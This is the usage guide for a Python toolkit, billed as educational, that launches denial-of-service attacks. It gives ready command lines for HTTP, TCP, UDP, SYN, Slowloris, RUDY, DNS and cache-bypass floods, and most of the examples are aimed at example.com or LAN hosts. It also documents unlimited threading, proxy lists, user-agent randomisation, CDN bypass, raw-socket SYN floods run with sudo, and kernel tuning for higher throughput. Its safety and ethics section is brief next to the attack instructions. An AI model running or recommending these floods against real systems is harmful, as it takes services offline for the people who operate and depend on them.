# 🗺 Usage Guide

**DDOS Attack Educational Toolkit**
*Created By: Rajsaraswati Jatav*

## 🎯 Quick Start

### Interactive Mode (Recommended for Beginners)
```bash
python main.py --interactive
```

### Command Line Mode
```bash
python main.py --target example.com --method http --threads 100 --duration 10
```

## 🗺 Interface Modes

### 1. Interactive Mode
Best for learning and experimentation:

```bash
python main.py --interactive
```

**Features:**
- 🎨 Beautiful ASCII art interface
- 📊 Real-time statistics
- 🔊 Sound effects
- ⚙️ Easy configuration
- 🎯 Module selection menu

### 2. Command Line Mode
Best for automation and scripting:

```bash
python main.py --target TARGET --method METHOD [OPTIONS]
```

### 3. GUI Mode (Coming Soon)
```bash
python main.py --gui
```

## ⚔️ Attack Modules

### 1. HTTP Flood
**Purpose**: Web server stress testing
```bash
python main.py --target example.com --method http --port 80 --threads 500
```

**Features:**
- Random user agents
- Dynamic payloads
- Cache busting
- Cookie simulation

### 2. TCP Flood
**Purpose**: Connection exhaustion testing
```bash
python main.py --target 192.168.1.100 --method tcp --port 22 --threads 200
```

**Features:**
- Connection flooding
- Random source ports
- Data transmission
- Connection management

### 3. UDP Flood
**Purpose**: Bandwidth consumption testing
```bash
python main.py --target 192.168.1.1 --method udp --port 53 --threads 1000
```

**Features:**
- Random packet sizes
- High-speed transmission
- Bandwidth saturation
- Protocol testing

### 4. SYN Flood
**Purpose**: Connection table exhaustion
```bash
python main.py --target server.local --method syn --port 80 --threads 500
```

**Features:**
- Half-open connections
- Resource exhaustion
- State table flooding
- Network layer testing

### 5. Slowloris
**Purpose**: Low-bandwidth application layer attacks
```bash
python main.py --target webapp.local --method slowloris --port 443 --threads 100
```

**Features:**
- Slow HTTP headers
- Connection persistence
- Low resource usage
- Stealth testing

### 6. RUDY Attack
**Purpose**: POST data flooding
```bash
python main.py --target api.local --method rudy --port 80 --threads 50
```

**Features:**
- Slow POST transmission
- Form data flooding
- Application testing
- Server resource exhaustion

### 7. DNS Flood
**Purpose**: DNS server stress testing
```bash
python main.py --target ns1.local --method dns --port 53 --threads 300
```

**Features:**
- DNS query flooding
- Random domain generation
- Resolution testing
- Infrastructure testing

### 8. CC Attack
**Purpose**: Cache bypass testing
```bash
python main.py --target cdn.local --method cc --port 80 --threads 200
```

**Features:**
- Cache poisoning
- CDN bypass
- Origin server testing
- Performance analysis

## ⚙️ Configuration Options

### Basic Options
```bash
--target TARGET          # Target IP or domain (required)
--method METHOD          # Attack method (required)
--port PORT             # Target port (default: 80)
--threads THREADS       # Thread count or 'unlimited'
--duration DURATION     # Attack duration in seconds
```

### Advanced Options
```bash
--proxy-file FILE       # Proxy list file
--config FILE           # Configuration file
--no-sound             # Disable sound effects
--no-visual            # Disable visual effects
--output FILE          # Log output to file
```

### Thread Management
```bash
# Fixed thread count
--threads 1000

# Unlimited threads (uses CPU cores * 200)
--threads unlimited

# Auto-scaling threads
--threads auto
```

## 📊 Monitoring and Statistics

### Real-time Statistics
During attacks, you'll see:
- 📊 **Requests sent**: Total requests
- ⚡ **Speed**: Requests per second
- 🎯 **Success rate**: Successful requests percentage
- 🔥 **Active threads**: Current thread count
- 💻 **CPU usage**: System resource usage
- 💾 **Memory usage**: RAM consumption

### Performance Metrics
```bash
┌── ATTACK STATISTICS ──────────────────┐
│ Total Requests: 50,000           │
│ Successful: 48,500 (97%)         │
│ Failed: 1,500 (3%)               │
│ Average Speed: 833.33 req/s      │
│ Peak Speed: 1,200 req/s          │
│ Duration: 60.0 seconds           │
└──────────────────────────────────┘
```

## 📝 Examples

### Educational Scenarios

#### Scenario 1: Web Server Testing
```bash
# Test your local web server
python main.py --target localhost --method http --port 8080 --threads 100 --duration 30
```

#### Scenario 2: Network Capacity Testing
```bash
# Test network bandwidth
python main.py --target 192.168.1.100 --method udp --threads 500 --duration 60
```

#### Scenario 3: Connection Limit Testing
```bash
# Test connection limits
python main.py --target server.local --method tcp --threads 200 --duration 120
```

#### Scenario 4: Application Layer Testing
```bash
# Test application resilience
python main.py --target app.local --method slowloris --threads 50 --duration 300
```

### Advanced Usage

#### Using Proxy Lists
```bash
# Create proxy list
echo "127.0.0.1:8080" > proxies.txt
echo "127.0.0.1:3128" >> proxies.txt

# Use proxies
python main.py --target example.com --method http --proxy-file proxies.txt
```

#### Custom Configuration
```bash
# Use custom config
python main.py --config my-config.json --target example.com
```

#### Logging and Output
```bash
# Log to file
python main.py --target example.com --method http --output attack.log
```

## 🔒 Safety and Ethics

### ✅ Acceptable Targets
- Your own servers and networks
- Authorized test environments
- Educational lab setups
- Explicitly permitted systems

### ❌ Unacceptable Targets
- Production systems without permission
- Third-party websites or services
- Critical infrastructure
- Government or military systems

### Best Practices
1. **Always get written permission**
2. **Use isolated test environments**
3. **Start with low intensity**
4. **Monitor system resources**
5. **Document your testing**
6. **Have a rollback plan**

## 🐛 Troubleshooting

### Common Issues

#### Low Performance
```bash
# Increase thread count
--threads unlimited

# Disable visual effects
--no-visual --no-sound
```

#### Connection Errors
```bash
# Check target accessibility
ping TARGET
nmap -p PORT TARGET
```

#### Permission Errors
```bash
# Run with appropriate permissions
sudo python main.py  # For raw sockets (SYN flood)
```

### Performance Tuning

#### System Optimization
```bash
# Increase file descriptor limits
ulimit -n 65535

# Optimize network settings
echo 'net.core.somaxconn = 65535' >> /etc/sysctl.conf
```

#### Application Optimization
```bash
# Use unlimited threads for maximum performance
python main.py --target example.com --threads unlimited

# Disable unnecessary features
python main.py --target example.com --no-visual --no-sound
```

---

**Remember: Use responsibly and ethically! 🙏**